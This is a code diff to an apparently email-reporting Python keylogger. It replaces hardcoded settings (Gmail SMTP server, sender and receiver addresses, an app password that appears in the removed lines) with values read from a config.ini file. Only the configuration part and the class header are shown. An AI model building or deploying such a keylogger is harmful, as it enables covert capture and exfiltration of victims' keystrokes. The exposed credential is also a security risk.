@@ -3,16 +3,19 @@ import smtplib, ssl  # for sending email using SMTP protocol (gmail)
 # Timer is to make a method runs after an `interval` amount of time
 from threading import Timer
 from datetime import datetime
+import configparser
 
-SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
-file_path = "D:\\Personal\\keylog\\"
-smtp_server = "smtp.gmail.com"
-port = 587  # For starttls
-EMAIL_ADDRESS = "sender@gmail.com"
-receiver_email = "reciever@gmail.com"  # Enter receiver address
-#Following is app password that need to be generated on gmail
-EMAIL_PASSWORD = "zbrkksexjjvkic"
+config = configparser.ConfigParser()
+config.read('config.ini')
 
+SEND_REPORT_EVERY = int(config["KEYLOGGER"]["SEND_REPORT_EVERY"])  # in seconds, 60 means 1 minute and so on
+file_path = config["KEYLOGGER"]["file_path"]
+smtp_server = str(config["KEYLOGGER"]["smtp_server"])
+port = int(config["KEYLOGGER"]["port"])  # For starttls
+EMAIL_ADDRESS = str(config["KEYLOGGER"]["EMAIL_ADDRESS"])
+receiver_email = str(config["KEYLOGGER"]["receiver_email"])  # Enter receiver address
+# Following is app password that need to be generated on gmail
+EMAIL_PASSWORD = str(config["KEYLOGGER"]["EMAIL_PASSWORD"])
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
